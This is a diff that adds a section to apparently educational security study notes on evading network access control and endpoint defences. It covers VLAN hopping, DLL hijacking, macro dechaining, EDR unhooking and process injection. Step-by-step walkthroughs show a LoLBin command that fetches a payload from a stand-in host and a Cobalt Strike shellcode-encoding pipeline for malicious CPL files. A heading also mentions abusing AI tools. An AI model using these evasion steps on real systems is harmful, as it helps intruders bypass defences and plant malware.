@@ -4187,3 +4187,114 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 			- Network-based intrusion detection systems (NIDS) analyze traffic from source to destination to detect threats. However, if an attacker establishes an encrypted session with the target using protocols like Secure Shell (SSH), Secure Socket Layer (SSL), or Virtual Private Network (VPN) tunnels, the IDS cannot inspect the encrypted packets. This allows attackers to transmit malicious traffic securely, bypassing IDS detection.
 		- Flooding:
 			- Intrusion detection systems rely on computational resources such as memory and processing power to analyze network traffic. Attackers can overload an IDS by flooding it with excessive noise or fake traffic, exhausting its resources. Once the IDS is overwhelmed, it becomes incapable of effectively analyzing legitimate traffic. At this point, attackers can inject actual malicious payloads into the network, which may go undetected due to system overload.
+- Evading NAC and Endpoint Security:
+	- Network Access Control (NAC) is a security mechanism designed to prevent unauthorized or unknown devices from accessing internal network resources. However, attackers often attempt to bypass NAC using various techniques to conduct malicious activities within the target network.
+	- Endpoint security adds an additional layer of protection to end-user devices such as desktops, laptops, tablets, and digital printers, safeguarding them against malware and other cyber threats. Despite this, attackers employ sophisticated evasion techniques to bypass Endpoint Detection and Response (EDR) solutions, enabling them to infect devices with malware, establish command and control (C2), and maintain persistence while avoiding detection.
+	- NAC and Endpoint Security Evasion Techniques:
+    	- Bypassing NAC Using VLAN Hopping:
+			- Attackers use VLAN hopping to gain unauthorized access to a network through the Dynamic Trunking Protocol (DTP). To establish a trunk connection with a switch, attackers send specially crafted DTP packets while configuring the switch mode to "dynamic auto" or "dynamic desirable." Once the trunk is established, attackers can access multiple VLANs, bypassing network segmentation.
+			- VLAN Hopping Tools - VLANPWN:
+				- VLANPWN is a simple script used for VLAN enumeration and hopping. It consists of two Python scripts designed to facilitate VLAN-hopping attacks:
+				- DoubleTagging.py: Executes a VLAN-hopping attack by injecting a frame with two 802.1Q tags. Additionally, it sends a test ICMP request.
+				- DTPHijacking.py: Conducts a DTP-switch spoofing/hijacking attack by sending a malicious DTP-desirable frame, converting the attacker's machine into a trunk channel. This method allows attackers to bypass VLAN segmentation and gain access to all VLAN traffic.
+		- Bypassing NAC Using Pre-Authenticated Device:
+			- Attackers can gain access to a pre-authenticated device and use it to bypass Network Access Control (NAC). They achieve this by inserting their own device (e.g., a Raspberry Pi) between the authenticated device and the network switch, allowing traffic to flow through their system undetected. This method enables attackers to inject unauthorized network packets while maintaining the appearance of a legitimate connection.
+			- Tools to Bypass NAC Using a Pre-Authenticated Device:
+				- nac_bypass_setup.sh:
+					- A fundamental requirement for NAC bypassing is access to a device that has already been authenticated on the network. Attackers leverage this trusted device to log in and then introduce unauthorized network traffic from an external device.
+					- This technique involves placing the attacker's system between the network switch and the authenticated device. One common approach is using a Raspberry Pi with two network adapters to facilitate the interception and relay of network communications.
+				- FENRIR (github.com)
+				- NACkered (github.com)
+				- Silentbridge (github.com)
+				- BITM (github.com)
+		- Bypassing Endpoint Security Using Ghostwriting:
+			- Ghostwriting is a technique used to bypass endpoint security by modifying the structure of malware code without affecting its functionality. This is achieved by deconstructing assembly code and inserting arbitrary instructions. Attackers use this method to evade antivirus detection and bypass security agents on endpoint devices by disguising malware to avoid signature-based detection.
+			- Ghostwriting Tools:
+				- Ghostwriting.sh:
+					- Ghostwriting.sh is a tool designed to bypass antivirus software by performing binary deconstruction, inserting arbitrary assembly instructions, and reconstructing the modified code.
+					- It leverages built-in Metasploit tools to automate this process.
+						- It generates a Meterpreter reverse TCP binary to establish a connection with the attacker's private IP address.
+						- The binary is disassembled, and junk code is inserted to evade signature-based detection.
+						- The modified binary is then reassembled.
+						- Finally, the script opens a web server on the attacker's machine, enabling the transfer of the modified file to the victim's machine while bypassing endpoint security systems.
+		- Bypassing Endpoint Security by Exploiting Application Whitelisting:
+			- Application whitelisting is a security feature in Windows designed to prevent the execution of unauthorized or malicious applications. It maintains a list of signed applications that are permitted to run on the system.
+			- When a legitimate and signed application is executed, Windows searches for the required DLLs (Dynamic Link Libraries) in the same directory as the executable before checking other locations. Attackers exploit this behavior through DLL hijacking by placing a malicious DLL—named identically to the one the application is expecting—within the same directory as the executable. As a result, the malicious DLL is loaded and executed along with the legitimate application, allowing attackers to bypass endpoint security measures.
+			- DLL Hijacking and Security Evasion: DLL hijacking exploits how Windows handles DLL loading and its search order, which determines where the system looks for DLLs when a program is launched. By hijacking DLL loading, attackers can:
+				- Maintain persistence on a compromised system
+				- Escalate privileges
+				- Evade detection while executing malicious payloads
+			- In addition to DLL hijacking, attackers can use built-in Windows utilities such as rundll32.exe, regsvr32.exe and PowerShell. These tools allow attackers to load malicious DLLs while bypassing security controls.
+		- Bypassing Endpoint Security by Dechaining Macros:
+			- Microsoft Office macros are widely used to automate tasks, but attackers can exploit them to execute malicious code and compromise systems. Since macros are based on VBScript, attackers craft VBA-based malicious code to manipulate system memory, modify the Windows registry, and alter system files. Dechaining macros is a technique used to evade both static and dynamic detection mechanisms in endpoint security solutions.
+			- Techniques for Bypassing Endpoint Security Using Dechained Macros:
+				- Spawning Through ShellCOM: Attackers leverage COM objects to spawn processes. By referencing any COM-associated object through VBScript, they can execute arbitrary functions. The ShellBrowserWindow object is commonly used to launch new processes.
+				- Spawning Using XMLDOM: Attackers use XMLDOM (XML Document Object Model) to execute process spawning. This technique allows them to download and run code within an active Office process, bypassing security restrictions.
+				- Spawning Through WmiPrvse.exe: To launch new processes or executables remotely, attackers exploit Windows Management Instrumentation (WMI). By spawning processes through wmiprvse.exe, attackers can execute code outside the Office process, avoiding detection.
+				- Creating Scheduled Tasks: VBScript can be used to create scheduled tasks, allowing attackers to execute malicious payloads at specific times. This technique also enables task dechaining, ensuring the payload executes independently of the original Office macro.
+				- Registry Modification: Attackers leverage VBScript to modify the Windows registry, altering system settings, storing payloads, and establishing persistence. Since registry modifications can execute payloads on system boot, the payload execution is decoupled from the macro itself, making detection more difficult.
+				- Dropping Files: Using FileSystemObject, attackers can drop files onto the system through VBScript. This method enables dechaining, as payload execution occurs at startup rather than during macro execution.
+				- Downloading Content: Attackers use VBScript to download and inject malicious content into memory, the registry, or disk. This is achieved using the XMLHTTP library along with ADODB, allowing attackers to deliver and execute payloads stealthily.
+				- Embedding and Dropping Files: Attackers exploit Metasploit’s "vba-exe" feature to create a macro containing an embedded payload. When executed, this payload is dropped onto the system and run, bypassing security controls.
+		- Bypassing Endpoint Security by Clearing Memory Hooks:
+			- Memory hooking is a technique used to monitor and modify an application's execution process. Endpoint Detection and Response (EDR) agents place these hooks to collect information for behavior-based analysis. These hooks send data to the EDR agent, which operates at a high-privileged kernel level, helping detect malicious activities such as remote code execution, lateral movement, and privilege escalation in real time.
+			- For example, if a new process is spawned in a detached state and memory permissions are altered to execute the WriteProcessMemory procedure, the EDR system can still analyze the data and determine whether the running process is malicious.
+			- To evade detection, attackers often attempt to bypass EDR monitoring by unhooking EDR-related DLLs from memory. This requires identifying the application's DLLs, associated functions, and exported syscalls. Open-source tools such as the x64dbg debugger are commonly used to locate hooked syscalls stored in memory during execution.
+			- Attackers then craft a payload to overwrite these memory hooks by restoring the original bytes of data. This is achieved by reloading the correct memory location where the hooks reside and erasing the EDR-imposed hooks. Once the syscalls are successfully restored, the EDR’s DLL remains on disk but no longer receives any information, as the hooks have been removed.
+			- Additionally, attackers can execute malicious payloads using custom assembly code and syscalls to evade EDR detection. Since these syscalls are not exported from system DLLs, EDR solutions fail to detect any activity because their hooks are not triggered. To achieve this, attackers must configure specific variables and registry values to execute their own syscalls while also determining the correct syscall IDs, which vary depending on the target OS and version.
+		- Bypassing Endpoint Security with Process Injection:
+			- Process injection is a sophisticated technique used by attackers to inject malicious code into the memory of running processes. By injecting code into an active process, malware can evade detection by security software, which often does not continuously monitor the internal state of every process for such modifications. This technique is commonly used as part of a broader attack strategy to maintain persistence, escalate privileges, or execute malicious actions while avoiding detection.
+			- Process injection attacks are typically carried out using Windows API functions, such as VirtualAllocEx(), WriteProcessMemory(), and CreateRemoteThread():
+				- VirtualAllocEx(): Allocates memory within the address space of a target process. Attackers use this function to reserve a memory block in the target process where they can inject their malicious payload.
+				- WriteProcessMemory(): Writes data into the memory space of a remote process. After allocating memory with VirtualAllocEx(), the attacker calls WriteProcessMemory() to inject the malicious payload into the allocated memory space.
+				- CreateRemoteThread(): Creates a new thread in the address space of the target process. After injecting the malicious payload, the attacker calls CreateRemoteThread() to execute the injected code within the target process.
+			- By leveraging these API functions, attackers can effectively run malicious code within legitimate processes, making detection and mitigation significantly more challenging for security solutions.
+    	- Bypassing EDR by Leveraging Living-off-the-Land Binaries (LoLBins):
+			- Living off the Land Binaries (LoLBins) are legitimate system tools that come preinstalled on the operating system or are downloaded from trusted sources such as Microsoft. Attackers can exploit these LoLBins for malicious purposes, such as installing malware or maintaining persistence on target networks. By leveraging LoLBins, attackers can evade security solutions since their activities appear normal and authorized.
+			- These tools also enable attackers to execute various malicious activities, such as installing command-and-control (C2) agents for advanced post-exploitation control, without triggering alerts or being detected by Endpoint Detection and Response (EDR) systems.
+			- Steps to Bypass EDR Using LoLBins
+				- Step 1: Payload Generation
+					- Configure the agent in Deimos C2 (a Golang-based command-and-control framework) to communicate over HTTPS.
+					- Download the generated agent and upload it to an external HTTP server.
+				- Step 2: Agent Download
+					- Execute the following command to use a Windows binary to download a remote file from the specified URL:
+					- C:\> ConfigSecurityPolicy.exe http://example.com/payload
+				- Step 3: Agent Execution
+					- Use CustomShellHost.exe to execute the downloaded payload and replace Explorer.exe with a custom application.
+					- On Windows 10 or 11, attackers with user privileges can run the following command to achieve this:
+					- C:\> CustomShellHost.exe
+			- By abusing LoLBins, attackers can effectively bypass EDR monitoring and execute malicious payloads while appearing to use legitimate system tools.
+		- Bypassing Endpoint Security Using CPL (Control Panel) Side-Loading:
+			- CPL files are typically developed for Windows Control Panel applets, providing quick access to various system tools. However, attackers can exploit CPL files to evade detection by leveraging legitimate .cpl files, which are commonly associated with Windows Control Panel utilities. This technique, known as CPL sideloading, mimics the functionality of a legitimate CPL applet, making malicious activities appear legitimate to both users and security systems.
+			- When a user executes a legitimate CPL file, malicious code embedded within the file is loaded. This can be achieved through various methods such as executing a specific function within the CPL file or exploiting vulnerabilities in how Windows handles CPL files.
+			- Attackers embed malicious payloads in CPL files and trick Windows into loading them via trusted applications instead of executing them directly. This can involve modifying application configuration files or leveraging startup execution for persistence. Since CPL files are rarely flagged as malicious, traditional security solutions often overlook them during routine scans.
+			- A common method involves renaming malicious DLLs (.dll) files with a .cpl extension and registering them at a specific location in the Windows Registry. Even if they lack standard CPL functions, they can still execute via DllEntryPoint when the Control Panel is accessed.
+			- Creating Malicious CPL Files Using CPLResourceRunner:
+				- Attackers can use tools such as CPLResourceRunner to generate malicious CPL files by following these steps:
+				- Step 1: Generate a Payload
+					- Use Cobalt Strike to generate a fully staged payload in x86 format, saving it as beacon.bin.
+				- Step 2: Convert the Payload to Shellcode
+					- Execute ConvertShellcode.py on beacon.bin to transform it into usable shellcode and save it as shellcode.txt.
+				- Step 3: Encode the Shellcode in Base64
+					- Run the following command to encode shellcode.txt into Base64 format for inclusion in a resource file:
+					- cat shellcode.txt | sed 's/[, ]//g; s/0x//g;' | tr -d '\n' | xxd -p -r | gzip -c | base64 > b64shellcode.txt
+				- Step 4: Prepare the Resource File
+					- Copy the encoded content from b64shellcode.txt into Resources.txt in the same folder.
+				- Step 5: Compile the Malicious CPL File
+					- Compile the resources in x86 format and copy CPLResourceRunner.dll into a new file named maliciousnew.cpl.
+			- By leveraging CPL sideloading, attackers can effectively bypass security measures, execute malicious payloads through trusted system components, and evade traditional detection mechanisms.
+    	- Abusing AI Tools (e.g., ChatGPT)
+    	- Using Metasploit Templates
+    	- Bypassing Windows Antimalware Scan Interface (AMSI)
+    	- Hosting Phishing Sites
+    	- Passing Encoded Commands
+    	- Fast Flux DNS Method
+    	- Timing-Based Evasion
+    	- Signed Binary Proxy Execution
+    	- Shellcode Encryption
+    	- Reducing Entropy
+    	- Escaping Local Antivirus (AV) Sandboxes
+    	- Disabling Event Tracing for Windows (ETW)
+    	- Evading "Mark of the Syscall" Detection
+    	- Spoofing the Thread Call Stack
+    	- In-Memory Encryption of Beacons
